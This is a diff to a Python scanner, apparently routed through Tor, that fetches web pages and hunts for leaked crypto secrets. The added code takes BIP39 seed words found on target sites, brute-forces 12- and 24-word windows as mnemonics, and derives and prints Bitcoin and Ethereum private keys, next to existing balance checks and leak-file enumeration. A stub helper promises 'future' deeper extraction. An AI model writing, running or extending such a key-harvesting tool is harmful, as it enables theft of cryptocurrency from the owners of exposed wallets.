@@ -12,6 +12,11 @@ import ssl
 import base64
 import json
 from datetime import datetime
+import re
+from eth_account import Account
+from bip_utils import Bip39SeedGenerator
+import bip32utils
+import hashlib
 
 # ===================== CONFIG =====================
 TOR_PROXIES = {
@@ -124,12 +129,48 @@ def private_key_scanner(base_url):
         print(f"    → Address: {addr}")
         check_balance(addr)
 
-    # BIP39 Mnemonic
+    # BIP39 Mnemonic - FUTURE EXTRACTION ENGINE v4 (clé privée BTC/ETH)
     words_found = re.findall(r'\b(?:' + '|'.join(BIP39_WORDS) + r')\b', r.text.lower())
     if len(set(words_found)) >= 12:
-        mnemonic = ' '.join(words_found[:24])
-        log_finding("CRITICAL", f"POSSIBLE BIP39 MNEMONIC SEED FOUND", base_url)
-        print(f"    → Mnemonic: {mnemonic}")
+        for length in [12, 24]:
+            for i in range(len(words_found) - length + 1):
+                candidate = words_found[i:i + length]
+                if len(set(candidate)) < 8:
+                    continue
+                mnemonic = ' '.join(candidate)
+                
+                try:
+                    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
+                    
+                    log_finding("CRITICAL", f"VALID BIP39 MNEMONIC ({length} words) - PRIVATE KEYS EXTRACTED", base_url)
+                    print("\n" + "="*130)
+                    print(f"[+] VALID SEED PHRASE EXTRAITE ({length} mots) :")
+                    print(f"    {mnemonic}")
+                    print("="*130)
+                    print(f"    Seed (hex)       : {seed_bytes.hex()}")
+                    
+                    # Bitcoin - Legacy, Native Segwit, Wrapped Segwit
+                    root_key = bip32utils.BIP32Key.fromEntropy(seed_bytes)
+                    for purpose, name in [(44, "Legacy"), (84, "Native Segwit"), (49, "Wrapped Segwit")]:
+                        btc_key = root_key.ChildKey(purpose + bip32utils.BIP32_HARDEN)\
+                                          .ChildKey(0 + bip32utils.BIP32_HARDEN)\
+                                          .ChildKey(0).ChildKey(0)
+                        print(f"    BTC {name}")
+                        print(f"        WIF         : {btc_key.WalletImportFormat()}")
+                        print(f"        PrivKey     : {btc_key.PrivateKey().hex()}")
+                        print(f"        Address     : {btc_key.Address()}")
+                    
+                    # Ethereum - 8 comptes
+                    for idx in range(8):
+                        acct = Account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/{idx}")
+                        print(f"    ETH Account {idx:2} | Address : {acct.address}")
+                        print(f"                  PrivKey : {acct.key.hex()}")
+                    
+                    print("-"*130)
+                    break
+                    
+                except Exception:
+                    continue
 
     # Leak file enumeration + parsing
     for file in COMMON_FILES:
@@ -337,3 +378,13 @@ def main():
 if __name__ == "__main__":
     requests.packages.urllib3.disable_warnings()
     main()
+
+# ====================== HELPER FUNCTIONS (FUTURE SCRIPT) ======================
+def extract_full_keys_from_mnemonic(mnemonic: str, line_info=""):
+    """Fonction autonome pour extraire tout si besoin"""
+    try:
+        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
+        print(f"\n[FUTURE] Deep extraction on mnemonic -> {mnemonic[:30]}...")
+        # Tu peux coller ici le même code de dérivation BTC/ETH que ci-dessus si tu veux une fonction séparée
+    except:
+        pass
